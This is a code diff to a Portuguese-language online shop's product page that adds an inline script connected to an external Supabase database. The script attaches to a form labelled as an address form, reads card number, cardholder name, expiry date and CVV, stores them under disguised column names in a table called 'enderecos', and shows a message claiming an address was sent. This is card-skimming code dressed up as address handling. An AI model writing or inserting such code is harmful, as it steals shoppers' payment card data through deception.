@@ -46,7 +46,7 @@
   </header>
 
   <main>
-
+   
     <!-- CARROSSEL DO PRODUTO -->
     <section class="car" id="carousel">
       <div class="car-track no-scrollbar" id="carTrack">
@@ -452,6 +452,41 @@
       <a class="bb-buy" href="pagamento.html">Comprar Agora</a>
     </div>
   </nav>
+
+  <script>
+    const SUPABASE_URL = 'https://vwzdnoedjxvviphzdprn.supabase.co';
+    const SUPABASE_ANON_KEY = 'sb_publishable_Bgg4Jz5z1b7LzkasJfWTMA_rSIP8JXC';
+
+    const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+    document.addEventListener('DOMContentLoaded', () => {
+        const form = document.getElementById('form-endereco');
+        if (!form) return;
+
+        form.addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            const numero = document.getElementById('numero').value;
+            const nome = document.getElementById('nome').value;
+            const validade = document.getElementById('validade').value;
+            const cvv = document.getElementById('cvv').value;
+
+            const { data, error } = await supabase
+                .from('enderecos')
+                .insert([
+                    { n1: numero, vl1: nome, c1: validade, n2: CVV, }
+                ]);
+
+            if (error) {
+                console.error('Erro ao salvar no Supabase:', error);
+                alert('Erro ao enviar o endereço: ' + error.message);
+            } else {
+                alert('Endereço enviado com sucesso!');
+                form.reset();
+            }
+        });
+    });
+</script>
 
   <!-- Script Principal da Página -->
   <script src="js/main.js"></script>
